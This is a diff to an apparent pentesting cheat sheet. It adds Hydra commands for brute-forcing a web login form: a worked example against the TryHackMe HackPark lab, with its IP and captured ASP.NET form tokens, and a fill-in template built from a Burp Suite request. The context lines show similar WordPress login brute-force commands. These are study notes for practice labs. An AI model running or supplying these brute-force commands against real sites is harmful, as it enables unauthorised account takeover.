@@ -246,6 +246,12 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f inferno.thm http-get /infe
 wordpress or any http post request
 ```
 hydra -L lists/usrname.txt -P lists/pass.txt <wp site address> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+# THM hackpark example
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.232.55 -V http-form-post '/Account/login.aspx:__VIEWSTATE=nQjYQoe%2B%2F0G9oiUNxdVyI0RQXGsJD58DgBFKbjVV5sazwLwhcrPc18tGvIfSQ4ewZzxGL6BUUBP%2BsRk4siWmxQTxMDfG6qyxwge093gJ5jS8RqbxfVJzsT7ZX5ScsE7MvfZz4JF0tHfA5RBK7oqiUgm0VlsWxwVMbBSCrxV4rlFMQCGu&__EVENTVALIDATION=9gnfa6%2FQtwI%2B%2BKQdgNdWKlfr%2B%2B%2FrG1q558pohQ6ttvKiHisZpTwtMztorVogDBZejCulSH8okL8ZLwHFjnG3SABi0aTVc776bj6uIlg8mjiKMsoGUAfZpFIBMlRb64sIL8ruzxQITQnJcpghbQGsEsPYZ%2FSdapXSGLfnjJsHcTC8VcjV&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'
+
+hydra -l admin -P <wordlist> -V http-form-post '<directory to login page>:<what you see on burpsuite request>^USER^...^PASS^:<how login fail message looks like>'
+
 ```
 
 ## Sample Hashcat Brute-Forcing
